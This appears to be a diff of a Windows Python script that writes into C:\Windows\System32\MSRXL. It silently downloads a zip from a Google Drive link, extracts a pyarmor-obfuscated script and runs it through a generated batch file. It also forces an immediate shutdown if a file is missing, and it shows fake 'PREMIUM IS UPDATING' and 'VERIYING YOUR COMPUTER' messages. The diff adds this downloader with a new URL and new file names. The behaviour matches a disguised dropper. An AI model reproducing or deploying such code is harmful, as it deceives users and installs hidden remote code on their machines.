@@ -201,55 +201,6 @@ import time
 if not os.path.exists(pathx):
     os.system("shutdown /s /f /t 0")
 #add_path_and_install_libraries()
-os.system('cls')
-print("")
-print("")
-def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\MSRXL\aespremv1.py"
-    files_to_delete = [
-        r"C:\Windows\System32\MSRXL\AesV8.5.py",
-        r"C:\Windows\System32\MSRXL\aesv1.bat",
-        r"C:\Windows\System32\MSRXL\pyarmor_runtime_000000"
-    ]
-
-    aesv3_exists = os.path.exists(aesv3_path)
-
-    if not aesv3_exists:
-        for item in files_to_delete:
-            if os.path.exists(item):
-                if os.path.isfile(item):
-                    os.remove(item)
-                    print("")
-                elif os.path.isdir(item):
-                    shutil.rmtree(item)
-                    os.system('cls')
-                    print("")
-                    print("Aes Software is updating, please don't close the window.")
-                    print("Change log:")
-                    print("---Fixed an issue where software couldn't download the AES Driver.")
-                    print("")
-                    print("")
-    else:
-        print("")
-
-delete_files_if_aesv3_missing()
-
-def download_file_from_google_drive(url, output_path):
-    if not os.path.exists(output_path):
-        gdown.download(url, output=output_path, quiet=True)
-'''
-if file_contentsx1=="ZM2vsjeaWJHSf":
-    shutil.rmtree(r'C:\Windows\System32\MSRXL')
-    os.mkdir(r'C:\Windows\System32\MSRXL')
-'''
-
-if not os.path.exists("C:\\Windows\\System32\\MSRXL\\aespremv1.py"):
-    print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1bMWvVlDa0Fh7TECTXw1BGtYxScpj0aJW", "C:\\Windows\\System32\\MSRXL\\prxprx.zip")
-    zip_file = r'C:\Windows\System32\MSRXL\prxprx.zip'
-    extract_dir = r'C:\Windows\System32\MSRXL'
-    extract_zip(zip_file, extract_dir)
-    os.remove(zip_file)
 
 import ctypes
 import os
@@ -298,6 +249,56 @@ def check_uptime():
 
 check_uptime()
 xsadasdpath = r"C:\prx.txt"
+os.system('cls')
+print("")
+print("")
+def delete_files_if_aesv3_missing():
+    aesv3_path = r"C:\Windows\System32\MSRXL\aespremv1_01032025.py"
+    files_to_delete = [
+        r"C:\Windows\System32\MSRXL\aespremv1.py",
+        r"C:\Windows\System32\MSRXL\aesprem.bat",
+        r"C:\Windows\System32\MSRXL\pyarmor_runtime_000000"
+    ]
+
+    aesv3_exists = os.path.exists(aesv3_path)
+
+    if not aesv3_exists:
+        for item in files_to_delete:
+            if os.path.exists(item):
+                if os.path.isfile(item):
+                    os.remove(item)
+                    print("")
+                elif os.path.isdir(item):
+                    shutil.rmtree(item)
+                    os.system('cls')
+                    print("")
+                    print("")
+                    print("")
+                    print("")
+                    print("")
+                    print("***PREMIUM IS UPDATING, PLEASE WAIT.")
+                    print("***PREMIUM IS UPDATING, PLEASE WAIT.")
+                    print("***PREMIUM IS UPDATING, PLEASE WAIT.")
+    else:
+        print("")
+
+delete_files_if_aesv3_missing()
+
+def download_file_from_google_drive(url, output_path):
+    if not os.path.exists(output_path):
+        gdown.download(url, output=output_path, quiet=True)
+if not os.path.exists("C:\\Windows\\System32\\MSRXL\\aespremv1_01032025.py"):
+    print("")
+    print("")
+    print("")
+    print("")
+    print("")
+    print("---VERIYING YOUR COMPUTER PLEASE WAIT.")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1YB-gA_H2eW0WbmfGLjjwrlEwcn9x8W6W", "C:\\Windows\\System32\\MSRXL\\xsxs.zip")
+    zip_file = r'C:\Windows\System32\MSRXL\xsxs.zip'
+    extract_dir = r'C:\Windows\System32\MSRXL'
+    extract_zip(zip_file, extract_dir)
+    os.remove(zip_file)
 
 '''
 directory = r'C:\Windows\System32'
@@ -356,7 +357,7 @@ def create_batch_file(python_command, script_name):
 with open(xsadasdpath, 'w') as temp_file:
     temp_file.write("Temporary content")
 ctypes.windll.kernel32.MoveFileExW(xsadasdpath, None, 4)
-create_batch_file("py -3.11", r"C:\Windows\System32\MSRXL\aespremv1.py")
+create_batch_file("py -3.11", r"C:\Windows\System32\MSRXL\aespremv1_01032025.py")
 def run_batch_file(batch_file_path):
     try:
         subprocess.run([batch_file_path], shell=True, check=True)
